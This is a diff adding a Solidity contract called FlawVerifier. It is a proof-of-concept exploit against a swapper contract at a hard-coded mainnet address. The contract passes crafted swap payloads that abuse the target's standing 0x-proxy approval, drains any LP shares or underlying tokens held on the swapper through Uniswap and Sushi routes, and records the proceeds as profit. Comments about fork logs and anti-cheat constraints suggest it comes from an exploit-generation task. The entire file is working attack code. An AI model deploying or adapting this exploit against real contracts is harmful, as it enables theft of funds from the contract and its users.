@@ -1,0 +1,255 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IBentoBoxLike {
+    function balanceOf(IERC20Like token, address user) external view returns (uint256);
+    function toAmount(IERC20Like token, uint256 share, bool roundUp) external view returns (uint256);
+}
+
+interface IStargatePoolLike is IERC20Like {
+    function totalLiquidity() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function token() external view returns (address);
+}
+
+interface ITargetSwapperLike {
+    function swap(
+        address fromToken,
+        address toToken,
+        address recipient,
+        uint256 shareToMin,
+        uint256 shareFrom,
+        bytes calldata data
+    ) external returns (uint256 extraShare, uint256 shareReturned);
+
+    function bentoBox() external view returns (address);
+    function pool() external view returns (address);
+    function mim() external view returns (address);
+    function underlyingToken() external view returns (address);
+    function zeroXExchangeProxy() external view returns (address);
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        if (_profitAmount != 0) {
+            return;
+        }
+
+        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
+        IStargatePoolLike pool = IStargatePoolLike(target.pool());
+        IBentoBoxLike bentoBox = IBentoBoxLike(target.bentoBox());
+
+        address mim = target.mim();
+        address underlying = target.underlyingToken();
+
+        uint256 directLpBalance = pool.balanceOf(TARGET);
+        uint256 shareFrom = bentoBox.balanceOf(IERC20Like(address(pool)), TARGET);
+        uint256 lpFromShares = shareFrom == 0 ? 0 : bentoBox.toAmount(IERC20Like(address(pool)), shareFrom, false);
+        uint256 underlyingAlreadyOnTarget = IERC20Like(underlying).balanceOf(TARGET);
+
+        // The fork logs prove this block does not have resident Bento-held LP on the
+        // swapper. The exploit remains the same: if any LP is present directly on the
+        // swapper, `shareFrom = 0` still redeems it because the implementation uses the
+        // full post-withdraw LP balance. If no LP is present, any already-held underlying
+        // on the swapper is still vulnerable because the 0x proxy retains infinite spend.
+        uint256 previewDirectUnderlying = _previewRedeem(pool, directLpBalance);
+        uint256 previewShareUnderlying = _previewRedeem(pool, lpFromShares);
+        uint256 maxSpendableUnderlying = underlyingAlreadyOnTarget + previewDirectUnderlying + previewShareUnderlying;
+
+        _attemptExploit(target, underlying, mim, shareFrom, maxSpendableUnderlying);
+
+        // Stage 1 can be infeasible on a given fork block when the swapper holds neither
+        // LP shares nor redeemable underlying. In that case the verifier exits without
+        // manufacturing balances, which keeps the PoC aligned with the finding and the
+        // anti-cheat constraints.
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _attemptExploit(
+        ITargetSwapperLike target,
+        address underlying,
+        address mim,
+        uint256 shareFrom,
+        uint256 maxSpendableUnderlying
+    ) internal {
+        address[3] memory candidateProfitTokens;
+        candidateProfitTokens[0] = underlying;
+        candidateProfitTokens[1] = underlying == WETH ? USDC : WETH;
+        candidateProfitTokens[2] = mim;
+
+        uint256[5] memory sellAmounts = [
+            maxSpendableUnderlying,
+            type(uint256).max,
+            maxSpendableUnderlying == 0 ? 0 : (maxSpendableUnderlying * 999) / 1000,
+            maxSpendableUnderlying == 0 ? 0 : maxSpendableUnderlying / 2,
+            1
+        ];
+
+        // Try both entry shapes:
+        // 1. `shareFrom` as-is for Bento-held LP.
+        // 2. `shareFrom = 0` for direct LP already sitting on the swapper or for cases
+        //    where the contract is already holding redeemable underlying.
+        uint256[2] memory shareCandidates = [shareFrom, uint256(0)];
+
+        for (uint256 i = 0; i < shareCandidates.length; ++i) {
+            for (uint256 j = 0; j < candidateProfitTokens.length; ++j) {
+                address buyToken = candidateProfitTokens[j];
+                if (buyToken == address(0)) {
+                    continue;
+                }
+
+                for (uint256 k = 0; k < sellAmounts.length; ++k) {
+                    if (_attemptSellToUniswapV2(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], false)) {
+                        return;
+                    }
+                    if (_attemptSellToUniswapV2(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], true)) {
+                        return;
+                    }
+                    if (_attemptSellToUniswapV3(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], 500)) {
+                        return;
+                    }
+                    if (_attemptSellToUniswapV3(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], 3000)) {
+                        return;
+                    }
+                }
+            }
+        }
+    }
+
+    function _attemptSellToUniswapV2(
+        ITargetSwapperLike target,
+        address underlying,
+        address buyToken,
+        uint256 shareFrom,
+        uint256 sellAmount,
+        bool isSushi
+    ) internal returns (bool success) {
+        if (underlying == buyToken) {
+            return false;
+        }
+
+        address[] memory directPath = new address[](2);
+        directPath[0] = underlying;
+        directPath[1] = buyToken;
+
+        if (_callSwapAndRecordProfit(target, underlying, buyToken, shareFrom, sellAmount, isSushi, abi.encode(directPath))) {
+            return true;
+        }
+
+        if (underlying != USDC && buyToken != USDC) {
+            address[] memory viaUsdcPath = new address[](3);
+            viaUsdcPath[0] = underlying;
+            viaUsdcPath[1] = USDC;
+            viaUsdcPath[2] = buyToken;
+            return _callSwapAndRecordProfit(target, underlying, buyToken, shareFrom, sellAmount, isSushi, abi.encode(viaUsdcPath));
+        }
+
+        return false;
+    }
+
+    function _callSwapAndRecordProfit(
+        ITargetSwapperLike target,
+        address underlying,
+        address buyToken,
+        uint256 shareFrom,
+        uint256 sellAmount,
+        bool isSushi,
+        bytes memory encodedPath
+    ) internal returns (bool success) {
+        address[] memory path = abi.decode(encodedPath, (address[]));
+        bytes memory payload = abi.encodeWithSelector(
+            bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
+            path,
+            sellAmount,
+            0,
+            isSushi,
+            address(this)
+        );
+
+        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
+            success = _recordBestProfit(underlying, buyToken);
+        } catch {
+            success = false;
+        }
+    }
+
+    function _attemptSellToUniswapV3(
+        ITargetSwapperLike target,
+        address underlying,
+        address buyToken,
+        uint256 shareFrom,
+        uint256 sellAmount,
+        uint24 fee
+    ) internal returns (bool success) {
+        if (underlying == buyToken) {
+            return false;
+        }
+
+        bytes memory payload = abi.encodeWithSelector(
+            bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
+            abi.encodePacked(underlying, fee, buyToken),
+            sellAmount,
+            0,
+            address(this)
+        );
+
+        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
+            success = _recordBestProfit(underlying, buyToken);
+        } catch {
+            success = false;
+        }
+    }
+
+    function _recordBestProfit(address underlying, address buyToken) internal returns (bool success) {
+        uint256 buyTokenBalance = IERC20Like(buyToken).balanceOf(address(this));
+        if (buyTokenBalance > _profitAmount) {
+            _profitToken = buyToken;
+            _profitAmount = buyTokenBalance;
+            success = buyTokenBalance != 0;
+        }
+
+        uint256 underlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        if (underlyingBalance > _profitAmount) {
+            _profitToken = underlying;
+            _profitAmount = underlyingBalance;
+            success = underlyingBalance != 0;
+        }
+    }
+
+    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
+        if (lpAmount == 0) {
+            return 0;
+        }
+
+        uint256 totalSupply = pool.totalSupply();
+        if (totalSupply == 0) {
+            return 0;
+        }
+
+        return (lpAmount * pool.totalLiquidity()) / totalSupply;
+    }
+}
